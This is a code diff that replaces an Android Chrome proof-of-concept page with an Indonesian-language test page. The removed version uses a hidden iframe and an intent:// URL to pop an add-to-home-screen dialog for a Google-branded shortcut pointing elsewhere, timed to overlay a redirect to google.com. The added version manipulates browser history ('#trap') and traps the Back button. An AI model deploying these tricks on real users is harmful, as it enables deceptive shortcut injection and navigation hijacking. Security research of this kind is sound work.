@@ -1,82 +1,113 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Android Intent - Add to Home Screen PoC</title>
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      background: #f8f9fa;
-      color: #202124;
-      min-height: 100vh;
-      margin: 0;
-      display: grid;
-      place-content: center;
-      text-align: center;
-    }
-
-    a {
-      display: inline-block;
-      padding: 16px 28px;
-      background: #1a73e8;
-      color: white;
-      text-decoration: none;
-      font-weight: 600;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-
-    a:active {
-      background: #1557b0;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uji Simulasi Navigasi - Chrome Android</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            background: #ffffff;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        h1 { font-size: 20px; color: #1a73e8; margin-top: 0; }
+        p { font-size: 14px; line-height: 1.5; color: #5f6368; }
+        .alert-box {
+            background: #fce8e6;
+            border-left: 4px solid #d93025;
+            padding: 12px;
+            margin: 16px 0;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #c5221f;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background-color: #1a73e8;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 8px;
+            margin-top: 20px;
+            box-sizing: border-box;
+        }
+        .btn:active { background-color: #1557b0; }
+        .log {
+            margin-top: 20px;
+            background: #f1f3f4;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #3c4043;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+    </style>
 </head>
 <body>
 
-  <h2>Android Intent Test</h2>
-  <a href="https://www.google.com" id="intentLink">
-    Trigger Add to Home Screen & Open Google
-  </a>
+    <div class="container">
+        <h1>Simulasi Konteks Riwayat (History State)</h1>
+        <p>Halaman ini dirancang untuk menguji bagaimana Chrome Android merespons manipulasi riwayat saat tombol <strong>Back (Kembali)</strong> ditekan.</p>
+        
+        <div class="alert-box">
+            <strong>Catatan Penelitian:</strong> Diperlukan interaksi awal (seperti klik tombol di bawah) agar browser mengizinkan manipulasi *history stack* demi mencegah *history spamming* otomatis.
+        </div>
 
-  <script>
-    const TARGET_URL = "https://www.google.com";
-    const INTENT_URL = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+        <a href="#" id="triggerBtn" class="btn">Mulai Simulasi & Masuk ke Situs Target</a>
 
-    let isTriggered = false;
+        <div class="log" id="logBox">Status: Menunggu interaksi pengguna...</div>
+    </div>
 
-    document.getElementById("intentLink").addEventListener("click", function(e) {
-      // Mencegah navigasi default agar script memiliki kontrol penuh atas timing
-      e.preventDefault();
-
-      if (isTriggered) return;
-      isTriggered = true;
-
-      // 1. Eksekusi intent ke dalam iframe tersembunyi terlebih dahulu
-      // Ini memicu Google App / Quick Search Box memunculkan dialog add to home screen
-      const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = INTENT_URL;
-      document.body.appendChild(iframe);
-
-      // 2. Berikan jeda waktu (timing) yang ideal (misal: 600ms) 
-      // Agar dialog sistem sempat muncul di atas layar sebelum browser memuat google.com
-      setTimeout(() => {
-        // Hapus iframe untuk membersihkan DOM
-        if (iframe && iframe.parentNode) {
-          iframe.parentNode.removeChild(iframe);
+    <script>
+        const logBox = document.getElementById('logBox');
+        function addLog(msg) {
+            logBox.innerHTML += `<br>> ${msg}`;
+            logBox.scrollTop = logBox.scrollHeight;
         }
 
-        // 3. Lakukan redirect otomatis ke google.com
-        window.location.href = TARGET_URL;
-      }, 600);
+        document.getElementById('triggerBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // 1. Memasukkan entri palsu ke dalam history stack
+            history.pushState({page: 1}, "State 1", "#trap");
+            history.pushState({page: 2}, "State 2", "#target");
+            
+            addLog("History state berhasil dimanipulasi.");
+            addLog("Mengarahkan ke target luar (misal: contoh.com)...");
 
-      // Reset status jika diperlukan setelah beberapa detik
-      setTimeout(() => {
-        isTriggered = false;
-      }, 2000);
-    });
-  </script>
+            // Simulasi pengalihan halaman setelah manipulasi history
+            setTimeout(() => {
+                // Ganti URL target sesuai kebutuhan riset lokal Anda
+                window.location.href = "https://example.com";
+            }, 1000);
+        });
+
+        // 2. Mendeteksi event popstate (ketika tombol Back ditekan di Android)
+        window.addEventListener('popstate', function(event) {
+            addLog("Tombol Back dideteksi! Event popstate terpicu.");
+            console.log("Popstate triggered:", event.state);
+            
+            // Di sinilah celah logika asli mengecoh browser (jika browser gagal 
+            // memvalidasi konteks asal unduhan atau navigasi balik).
+            // Untuk simulasi aman, kita cukup menampilkan peringatan/log:
+            alert("Perhatian: Tombol Back ditekan pada state manipulasi riwayat!");
+        });
+    </script>
 
 </body>
 </html>
